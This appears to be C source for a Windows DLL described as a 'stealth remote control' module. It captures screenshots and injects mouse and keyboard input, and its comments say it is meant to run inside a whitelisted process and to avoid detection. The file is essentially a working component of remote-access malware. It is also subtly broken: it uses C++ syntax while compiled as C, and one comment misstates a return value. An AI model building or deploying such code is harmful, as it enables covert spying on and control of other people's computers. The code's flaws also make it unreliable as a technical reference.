// main_dll.c - Screen capture + input injection module for stealth remote control
// Windows x64 native code - compiled as a DLL loaded from within a whitelisted process
// Uses GDI BitBlt (not DXGI) to avoid detection via DirectX integrity checks
//
// Compile with MSVC (Visual Studio Build Tools):
//   cl /LD /Fe:engine.dll main_dll.c /link user32.lib gdi32.lib gdiplus.lib
//
// Exported functions:
//   CaptureScreen(BYTE** outBuffer, int* outSize) - returns JPEG-compressed screenshot
//   InjectInput(int type, int x, int y, DWORD keyCode) - injects mouse/keyboard input
//   FreeBuffer(BYTE* buffer) - frees buffer allocated by CaptureScreen

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <gdiplus.h>
#include <stdio.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Global GDI+ token for JPEG compression
static ULONG_PTR g_gdiplusToken = 0;
static int g_gdiplusInitialized = 0;

// CLSID for JPEG encoder
static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT numEncoders = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&numEncoders, &size);
    if (size == 0) return -1;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;

    Gdiplus::GetImageEncoders(numEncoders, size, pImageCodecInfo);
    for (UINT i = 0; i < numEncoders; i++)
    {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return 0;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

// Initialize GDI+ (call once)
__declspec(dllexport) int InitEngine()
{
    if (g_gdiplusInitialized) return 0;

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    Gdiplus::Status status = Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    if (status != Gdiplus::Ok) return -1;

    g_gdiplusInitialized = 1;
    return 0;
}

// Capture screen and return JPEG-compressed bytes
// Returns: size of JPEG buffer, or -1 on error
// outBuffer must be freed with FreeBuffer()
__declspec(dllexport) int CaptureScreen(BYTE** outBuffer, int* outSize)
{
    if (!outBuffer || !outSize) return -1;

    *outBuffer = NULL;
    *outSize = 0;

    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create compatible DC and bitmap
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    if (!hBitmap)
    {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);

    // Capture screen using BitBlt (GDI, not DXGI - less detectable)
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    SelectObject(hMemoryDC, hOldBitmap);

    // Convert HBITMAP to GDI+ Bitmap for JPEG encoding
    Gdiplus::Bitmap* gdiBitmap = Gdiplus::Bitmap::FromHBITMAP(hBitmap, NULL);

    // Save to IStream (memory)
    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK)
    {
        delete gdiBitmap;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    CLSID encoderClsid;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);

    // Encode as JPEG with quality 75 (good balance of size/quality)
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 75;
    encoderParams.Parameter[0].Value = &quality;

    Gdiplus::Status saveStatus = gdiBitmap->Save(pStream, &encoderClsid, &encoderParams);

    if (saveStatus != Gdiplus::Ok)
    {
        pStream->Release();
        delete gdiBitmap;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    // Get buffer size and data from stream
    STATSTG stat;
    pStream->Stat(&stat, STATFLAG_NONAME);
    ULONG streamSize = stat.cbSize.LowPart;

    BYTE* buffer = (BYTE*)malloc(streamSize);
    if (!buffer)
    {
        pStream->Release();
        delete gdiBitmap;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return -1;
    }

    LARGE_INTEGER seekPos = {0};
    pStream->Seek(seekPos, STREAM_SEEK_SET, NULL);
    ULONG bytesRead = 0;
    pStream->Read(buffer, streamSize, &bytesRead);

    *outBuffer = buffer;
    *outSize = (int)bytesRead;

    // Cleanup
    pStream->Release();
    delete gdiBitmap;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return 0;
}

// Free buffer allocated by CaptureScreen
__declspec(dllexport) void FreeBuffer(BYTE* buffer)
{
    if (buffer) free(buffer);
}

// Inject mouse click or keyboard input
// type: 0 = mouse move, 1 = left click, 2 = right click, 3 = key down, 4 = key up
// x, y: coordinates (for mouse)
// keyCode: virtual key code (for keyboard)
__declspec(dllexport) int InjectInput(int type, int x, int y, DWORD keyCode)
{
    INPUT input = {0};
    int result = 0;

    switch (type)
    {
        case 0: // Mouse move - absolute coordinates
            input.type = INPUT_MOUSE;
            input.mi.dx = (x * 65535) / GetSystemMetrics(SM_CXSCREEN);
            input.mi.dy = (y * 65535) / GetSystemMetrics(SM_CYSCREEN);
            input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
            result = SendInput(1, &input, sizeof(INPUT));
            break;

        case 1: // Left click down + up
            // Move first
            input.type = INPUT_MOUSE;
            input.mi.dx = (x * 65535) / GetSystemMetrics(SM_CXSCREEN);
            input.mi.dy = (y * 65535) / GetSystemMetrics(SM_CYSCREEN);
            input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
            SendInput(1, &input, sizeof(INPUT));

            // Click down
            ZeroMemory(&input, sizeof(INPUT));
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            SendInput(1, &input, sizeof(INPUT));

            // Click up
            ZeroMemory(&input, sizeof(INPUT));
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
            result = SendInput(1, &input, sizeof(INPUT));
            break;

        case 2: // Right click
            // Move first
            input.type = INPUT_MOUSE;
            input.mi.dx = (x * 65535) / GetSystemMetrics(SM_CXSCREEN);
            input.mi.dy = (y * 65535) / GetSystemMetrics(SM_CYSCREEN);
            input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
            SendInput(1, &input, sizeof(INPUT));

            ZeroMemory(&input, sizeof(INPUT));
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            SendInput(1, &input, sizeof(INPUT));

            ZeroMemory(&input, sizeof(INPUT));
            input.type = INPUT_MOUSE;
            input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            result = SendInput(1, &input, sizeof(INPUT));
            break;

        case 3: // Key down
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = keyCode;
            input.ki.dwFlags = 0;
            result = SendInput(1, &input, sizeof(INPUT));
            break;

        case 4: // Key up
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = keyCode;
            input.ki.dwFlags = KEYEVENTF_KEYUP;
            result = SendInput(1, &input, sizeof(INPUT));
            break;
    }

    return (result > 0) ? 0 : -1;
}

// Cleanup GDI+
__declspec(dllexport) void ShutdownEngine()
{
    if (g_gdiplusInitialized)
    {
        Gdiplus::GdiplusShutdown(g_gdiplusToken);
        g_gdiplusInitialized = 0;
    }
}

// DllMain
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // Don't call DllMain for thread events
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            ShutdownEngine();
            break;
    }
    return TRUE;
}
